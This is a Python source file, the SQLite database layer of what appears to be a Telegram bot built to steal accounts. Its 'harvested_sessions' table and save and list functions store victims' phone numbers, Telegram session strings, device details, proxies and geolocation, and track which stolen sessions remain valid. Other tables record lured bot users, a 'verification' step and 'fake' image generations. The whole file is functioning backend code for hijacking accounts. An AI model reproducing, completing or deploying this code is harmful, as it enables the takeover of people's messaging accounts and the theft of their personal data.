"""SQLite database layer."""
import os
import sqlite3
import threading
from typing import Optional, Dict, List, Any

class Database:
    _local = threading.local()

    def __init__(self, db_path: str = "data/sessions.db"):
        self.db_path = db_path
        self._init_db()

    def _get_conn(self) -> sqlite3.Connection:
        if not hasattr(self._local, 'conn') or self._local.conn is None:
            self._local.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self._local.conn.row_factory = sqlite3.Row
        return self._local.conn

    def _init_db(self):
        os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS harvested_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_tg_id INTEGER,
                victim_username TEXT,
                phone TEXT NOT NULL,
                session_string TEXT NOT NULL,
                device_model TEXT,
                system_version TEXT,
                app_version TEXT,
                proxy_used TEXT,
                ip_geolocation TEXT,
                auth_timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                is_valid INTEGER DEFAULT 1,
                last_check DATETIME,
                notes TEXT
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS bot_users (
                tg_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                last_name TEXT,
                language_code TEXT,
                joined_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                free_generations_used INTEGER DEFAULT 0,
                total_generations INTEGER DEFAULT 0,
                referral_code TEXT UNIQUE,
                referred_by INTEGER,
                is_premium INTEGER DEFAULT 0,
                is_verified INTEGER DEFAULT 0,
                verification_state TEXT,
                last_activity DATETIME
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS generations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_tg_id INTEGER,
                prompt TEXT,
                image_url TEXT,
                is_real INTEGER DEFAULT 1,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                processing_time REAL
            )
        """)

        cursor.execute("""
            CREATE TABLE IF NOT EXISTS audit_log (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                admin_tg_id INTEGER,
                action TEXT,
                target_id INTEGER,
                details TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)

        conn.commit()
        conn.close()

    def save_session(self, victim_tg_id: int, phone: str, session_string: str,
                     device_info: Dict[str, str], proxy: str, username: Optional[str] = None) -> int:
        conn = self._get_conn()
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO harvested_sessions 
            (victim_tg_id, victim_username, phone, session_string, 
             device_model, system_version, app_version, proxy_used, ip_geolocation)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            victim_tg_id, username, phone, session_string,
            device_info.get("device_model"),
            device_info.get("system_version"),
            device_info.get("app_version"),
            proxy,
            device_info.get("ip_geo", "unknown")
        ))
        conn.commit()
        return cursor.lastrowid

    def get_all_sessions(self, limit: int = 100, offset: int = 0) -> List[Dict[str, Any]]:
        conn = self._get_conn()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM harvested_sessions ORDER BY auth_timestamp DESC LIMIT ? OFFSET ?", (limit, offset))
        return [dict(row) for row in cursor.fetchall()]

    def get_session_count(self) -> int:
        conn = self._get_conn()
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM harvested_sessions WHERE is_valid = 1")
        return cursor.fetchone()[0]

    def invalidate_session(self, session_id: int):
        conn = self._get_conn()
        cursor = conn.cursor()
        cursor.execute("UPDATE harvested_sessions SET is_valid = 0 WHERE id = ?", (session_id,))
        conn.commit()

    def get_or_create_user(self, tg_id: int, username: str = None,
                           first_name: str = None, last_name: str = None,
                           language_code: str = None) -> Dict[str, Any]:
        conn = self._get_conn()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM bot_users WHERE tg_id = ?", (tg_id,))
        row = cursor.fetchone()

        if row:
            cursor.execute("UPDATE bot_users SET last_activity = CURRENT_TIMESTAMP WHERE tg_id = ?", (tg_id,))
            conn.commit()
            return dict(row)

        import secrets
        ref_code = secrets.token_hex(4)
        cursor.execute("""
            INSERT INTO bot_users (tg_id, username, first_name, last_name, language_code, referral_code)
            VALUES (?, ?, ?, ?, ?, ?)
        """, (tg_id, username, first_name, last_name, language_code, ref_code))
        conn.commit()
        cursor.execute("SELECT * FROM bot_users WHERE tg_id = ?", (tg_id,))
        return dict(cursor.fetchone())

    def increment_generations(self, tg_id: int, is_real: bool = True):
        conn = self._get_conn()
        cursor = conn.cursor()
        if is_real:
            cursor.execute("""
                UPDATE bot_users SET free_generations_used = free_generations_used + 1,
                    total_generations = total_generations + 1, last_activity = CURRENT_TIMESTAMP
                WHERE tg_id = ?
            """, (tg_id,))
        else:
            cursor.execute("""
                UPDATE bot_users SET total_generations = total_generations + 1, last_activity = CURRENT_TIMESTAMP
                WHERE tg_id = ?
            """, (tg_id,))
        conn.commit()

    def set_verification_state(self, tg_id: int, state: str):
        conn = self._get_conn()
        cursor = conn.cursor()
        cursor.execute("UPDATE bot_users SET verification_state = ? WHERE tg_id = ?", (state, tg_id))
        conn.commit()

    def mark_verified(self, tg_id: int):
        conn = self._get_conn()
        cursor = conn.cursor()
        cursor.execute("UPDATE bot_users SET is_verified = 1, verification_state = NULL WHERE tg_id = ?", (tg_id,))
        conn.commit()

    def save_generation(self, user_tg_id: int, prompt: str, image_url: str, 
                        is_real: bool = True, processing_time: float = 0.0):
        conn = self._get_conn()
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO generations (user_tg_id, prompt, image_url, is_real, processing_time)
            VALUES (?, ?, ?, ?, ?)
        """, (user_tg_id, prompt, image_url, 1 if is_real else 0, processing_time))
        conn.commit()

    def get_stats(self) -> Dict[str, int]:
        conn = self._get_conn()
        cursor = conn.cursor()
        stats = {}
        cursor.execute("SELECT COUNT(*) FROM bot_users")
        stats["total_users"] = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM harvested_sessions WHERE is_valid = 1")
        stats["valid_sessions"] = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM harvested_sessions")
        stats["total_sessions"] = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM generations WHERE is_real = 1")
        stats["real_generations"] = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM generations WHERE is_real = 0")
        stats["fake_generations"] = cursor.fetchone()[0]
        return stats
